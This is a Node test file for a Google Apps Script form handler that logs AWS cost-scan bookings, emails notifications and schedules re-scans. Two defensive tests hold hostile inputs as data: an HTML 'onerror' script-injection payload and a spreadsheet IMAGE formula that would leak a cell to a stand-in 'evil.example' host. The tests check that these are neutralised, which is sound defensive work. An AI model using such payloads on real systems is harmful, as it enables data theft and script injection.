// Runs case-study-mailer.gs in Node with fake Google services (Sheets, Mail,
// Cache, triggers), so the Apps Script logic can be tested without deploying it.
//   node --test tests/case-study-mailer.test.mjs
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import vm from 'node:vm';

const SOURCE = readFileSync(new URL('../case-study-mailer.gs', import.meta.url), 'utf8');

function load({ quota = 100, failMailTo = null } = {}) {
  const sheets = {};
  const sent = [];
  const cache = new Map();
  const logs = [];
  const triggers = [];
  const sheet = name => {
    const rows = (sheets[name] ||= []);
    return {
      getLastRow: () => rows.length,
      appendRow: r => rows.push(r),
      setFrozenRows: () => {},
      getDataRange: () => ({ getValues: () => rows.map(r => r.slice()) }),
      getRange: (r, c) => ({ setValue: v => { rows[r - 1][c - 1] = v; } }),
    };
  };
  const ctx = {
    SpreadsheetApp: { getActiveSpreadsheet: () => ({
      getSheetByName: n => (sheets[n] ? sheet(n) : null),
      insertSheet: n => sheet(n),
      getSheets: () => [sheet('Sheet1')],
    }) },
    MailApp: {
      getRemainingDailyQuota: () => quota,
      sendEmail: m => {
        if (failMailTo && m.to === failMailTo) throw new Error('simulated mail failure');
        sent.push(m);
      },
    },
    CacheService: { getScriptCache: () => ({
      get: k => cache.get(k) ?? null,
      put: (k, v) => cache.set(k, v),
    }) },
    ContentService: {
      MimeType: { JSON: 'json' },
      createTextOutput: s => ({ setMimeType: () => ({ getContent: () => s }) }),
    },
    Utilities: {
      formatDate: (d, _tz, fmt) => (fmt === 'yyMMdd' ? '260930' : new Date(d).toISOString().slice(0, 10)),
      base64Encode: b => Buffer.from(b).toString('base64'),
      computeDigest: (_a, s) => [...Buffer.from(String(s))],
      DigestAlgorithm: { MD5: 'md5' },
    },
    Session: { getScriptTimeZone: () => 'Asia/Kolkata' },
    ScriptApp: {
      getProjectTriggers: () => triggers,
      newTrigger: fn => ({ timeBased: () => ({ everyDays: () => ({ atHour: () => ({
        create: () => triggers.push({ getHandlerFunction: () => fn }) }) }) }) }),
    },
    UrlFetchApp: { fetch: () => ({ getBlob: () => ({ setName() { return this; } }) }) },
    Logger: { log: m => logs.push(m) },
  };
  vm.createContext(ctx);
  vm.runInContext(SOURCE, ctx);
  const post = parameter => JSON.parse(ctx.doPost({ parameter }).getContent());
  // Read a booking row by column name, so tests don't depend on column order.
  const cell = (rowIndex, header) => {
    const rows = sheets['Audit bookings'];
    return rows[rowIndex][rows[0].indexOf(header)];
  };
  return { post, sheets, sent, logs, ctx, cell, triggers };
}

const booking = (over = {}) => ({
  form: 'audit_booking', name: 'Asha Rao', email: 'Asha@Example.com', company: 'Acme Cloud',
  spend: '$10k–$50k', phone: '+91 98765 43210', currency: 'INR', notes: 'Mostly EC2', page: 'test',
  ...over,
});
const isDate = v => Object.prototype.toString.call(v) === '[object Date]';   // dates come from the sandbox realm

test('valid booking: logged, hello@ notified, customer confirmed, reference returned', () => {
  const { post, sheets, sent, cell } = load();
  const res = post(booking());
  assert.equal(res.ok, true);
  assert.match(res.reference, /^AUD-260930-[A-HJ-NP-Z2-9]{4}$/);

  assert.equal(sheets['Audit bookings'].length, 2, 'header + one booking');
  assert.equal(cell(1, 'Reference'), res.reference);
  assert.equal(cell(1, 'Email'), 'asha@example.com', 'email is lower-cased');
  assert.equal(cell(1, 'Full report price'), '₹19,999');
  assert.equal(cell(1, 'Re-scan'), 'Just once');
  assert.equal(cell(1, 'Next scan'), '');
  assert.equal(cell(1, 'Status'), 'new');

  assert.equal(sent.length, 2);
  assert.equal(sent[0].to, 'hello@exommerce.online');
  assert.equal(sent[0].replyTo, 'asha@example.com');
  assert.ok(sent[0].subject.startsWith('Free scan booking ' + res.reference));
  assert.ok(sent[0].body.includes(`python -m exaudit setup --reference ${res.reference} --customer "Acme Cloud"`));
  assert.equal(sent[1].to, 'asha@example.com');
  assert.equal(sent[1].replyTo, 'hello@exommerce.online');
  assert.equal(sent[1].subject, `Your free AWS cost scan (${res.reference})`);
  assert.ok(sent[1].htmlBody.includes(res.reference));
  assert.ok(sent[1].body.startsWith('Hi Asha,'));
  for (const text of [sent[1].body, sent[1].htmlBody]) {
    assert.ok(text.includes('free summary'), 'sets expectations: the summary is free');
    assert.ok(!/refund|guarantee/i.test(text), 'no refund promise any more');
  }
});

test('a quarterly or yearly re-scan is scheduled at booking', () => {
  const { post, cell, sent } = load();
  post(booking({ cadence: 'quarterly' }));
  assert.equal(cell(1, 'Re-scan'), 'Every quarter');
  const next = cell(1, 'Next scan');
  assert.ok(isDate(next));
  const months = (next.getFullYear() - new Date().getFullYear()) * 12 + next.getMonth() - new Date().getMonth();
  assert.equal(months, 3);
  assert.match(sent[1].body, /check again every quarter/);

  const yearly = load();
  yearly.post(booking({ cadence: 'yearly' }));
  assert.equal(yearly.cell(1, 'Re-scan'), 'Every year');

  const odd = load();
  odd.post(booking({ cadence: 'hourly' }));
  assert.equal(odd.cell(1, 'Re-scan'), 'Just once', 'unknown schedules fall back to once');
});

test('due re-scans are sent to hello@ once, then roll forward', () => {
  const { post, sheets, sent, ctx, cell } = load();
  post(booking({ cadence: 'quarterly', email: 'due@example.com' }));
  post(booking({ cadence: 'yearly', email: 'later@example.com', company: 'Later Co' }));
  post(booking({ cadence: 'once', email: 'once@example.com', company: 'Once Co' }));
  const rows = sheets['Audit bookings'];
  const nextCol = rows[0].indexOf('Next scan');
  rows[1][nextCol] = new Date(Date.now() - 86400000);          // due yesterday
  sent.length = 0;

  assert.equal(ctx.remindDueScans(), 1);
  assert.equal(sent.length, 1);
  assert.equal(sent[0].to, 'hello@exommerce.online');
  assert.equal(sent[0].subject, '1 re-scan due');
  assert.ok(sent[0].body.includes('due@example.com') && sent[0].body.includes('Every quarter'));
  assert.ok(!sent[0].body.includes('later@example.com'), 'not due yet');
  const rolled = cell(1, 'Next scan');
  assert.ok(isDate(rolled) && rolled > new Date(), 'moved on by a quarter');
  assert.ok(isDate(cell(1, 'Last reminder')));

  sent.length = 0;
  assert.equal(ctx.remindDueScans(), 0, 'nothing twice');
  assert.equal(sent.length, 0);
});

test('reminders are installed once', () => {
  const { ctx, triggers } = load();
  assert.equal(ctx.installReminders(), true);
  assert.equal(ctx.installReminders(), false);
  assert.equal(triggers.length, 1);
});

test('no bookings sheet yet: reminders do nothing', () => {
  const { ctx, sent } = load();
  assert.equal(ctx.remindDueScans(), 0);
  assert.equal(sent.length, 0);
});

test('price comes from the server, not the browser', () => {
  const { post, cell } = load();
  post(booking({ currency: 'USD', price: '$1' }));
  assert.equal(cell(1, 'Full report price'), '$299');
  const other = load();
  other.post(booking({ currency: 'GBP' }));
  assert.equal(other.cell(1, 'Currency'), 'USD', 'unknown currency falls back to USD');
});

test('validation rejects bad input and sends nothing', () => {
  const cases = [
    [{ name: '' }, /name and company/],
    [{ company: '   ' }, /name and company/],
    [{ email: 'not-an-email' }, /valid email/],
    [{ spend: '$1M' }, /monthly AWS spend/],
    [{ phone: 'call me maybe' }, /phone/],
  ];
  for (const [over, msg] of cases) {
    const { post, sent, sheets } = load();
    const res = post(booking(over));
    assert.equal(res.ok, false, JSON.stringify(over));
    assert.match(res.error, msg);
    assert.equal(sent.length, 0);
    assert.equal(sheets['Audit bookings'], undefined);
  }
});

test('phone is optional', () => {
  const { post } = load();
  assert.equal(post(booking({ phone: '' })).ok, true);
});

test('resubmitting within 10 minutes returns the same reference and sends nothing new', () => {
  const { post, sent, sheets } = load();
  const first = post(booking());
  const again = post(booking({ email: 'asha@example.com', company: 'ACME CLOUD' }));
  assert.equal(again.ok, true);
  assert.equal(again.reference, first.reference);
  assert.equal(again.duplicate, true);
  assert.equal(sent.length, 2);
  assert.equal(sheets['Audit bookings'].length, 2);
});

test('honeypot: bots get a fake success and nothing happens', () => {
  const { post, sent, sheets } = load();
  assert.deepEqual(post(booking({ website: 'http://spam' })), { ok: true });
  assert.equal(sent.length, 0);
  assert.equal(sheets['Audit bookings'], undefined);
});

test('email quota exhausted: booking still logged as failed, customer told to email', () => {
  const { post, sheets, sent } = load({ quota: 1 });
  const res = post(booking());
  assert.equal(res.ok, false);
  assert.match(res.error, /hello@exommerce.online/);
  assert.equal(sent.length, 0);
  assert.match(sheets['Audit bookings'][1].at(-1), /^failed: daily email quota/);
});

test('notification failure: logged as failed and reported, so the page falls back to email', () => {
  const { post, sheets } = load({ failMailTo: 'hello@exommerce.online' });
  const res = post(booking());
  assert.equal(res.ok, false);
  assert.match(sheets['Audit bookings'][1].at(-1), /^failed: Error: simulated mail failure/);
});

test('confirmation failure does not fail a booking hello@ already has', () => {
  const { post, logs, cell } = load({ failMailTo: 'asha@example.com' });
  const res = post(booking());
  assert.equal(res.ok, true);
  assert.equal(cell(1, 'Status'), 'new');
  assert.match(logs[0], /confirmation failed/);
});

test('HTML in names is escaped in the confirmation email', () => {
  const { post, sent } = load();
  post(booking({ name: '<img src=x onerror=alert(1)> Rao' }));
  assert.ok(!sent[1].htmlBody.includes('<img'));
  assert.ok(sent[1].htmlBody.includes('&lt;img'));
});

test('spreadsheet formulas from visitors are stored as plain text', () => {
  const { post, sheets, cell } = load();
  post(booking({ name: '=IMAGE("https://evil.example/?"&A1)', company: '@SUM(1)', notes: '-2+3' }));
  assert.equal(cell(1, 'Name'), `'=IMAGE("https://evil.example/?"&A1)`);
  assert.equal(cell(1, 'Company'), "'@SUM(1)");
  assert.equal(cell(1, 'Phone / WhatsApp'), "'+91 98765 43210", 'phone numbers stay text, not a formula');
  assert.equal(cell(1, 'Notes'), "'-2+3");
  assert.ok(isDate(sheets['Audit bookings'][1][0]), 'non-strings are untouched');

  const other = load();
  other.post({ form: 'contact', first_name: '=1+1', email: 'a@b.co', company: 'C', message: 'Hi' });
  assert.equal(other.sheets['Contact enquiries'][1][1], "'=1+1", 'contact tab protected too');
});

test('small accounts are flagged for hello@', () => {
  const { post, sent } = load();
  post(booking({ spend: 'Under $3k' }));
  assert.match(sent[0].body, /Small account \(under \$3k\/month\)/);
});

test('long fields are trimmed to their limits', () => {
  const { post, cell } = load();
  post(booking({ notes: 'x'.repeat(5000), name: 'N'.repeat(300) }));
  assert.equal(cell(1, 'Name').length, 100);
  assert.equal(cell(1, 'Notes').length, 2000);
});

test('GET reports which forms this deployment handles', () => {
  const ctx = { ContentService: { MimeType: { JSON: 'json' }, createTextOutput: s => ({ setMimeType: () => ({ getContent: () => s }) }) } };
  vm.createContext(ctx);
  vm.runInContext(SOURCE, ctx);
  const res = JSON.parse(ctx.doGet().getContent());
  assert.equal(res.ok, true);
  assert.ok(res.forms.includes('audit_booking'));
});

test('existing flows still route correctly', () => {
  const { post, sheets } = load();
  const contact = post({ form: 'contact', first_name: 'A', email: 'a@b.co', company: 'C', message: 'Hi' });
  assert.equal(contact.ok, true);
  assert.equal(sheets['Contact enquiries'].length, 2);
  const cs = post({ study: 'nope', first_name: 'A', email: 'a@b.co', company: 'C', consent: 'yes' });
  assert.deepEqual(cs, { ok: false, error: 'Unknown case study' });
});
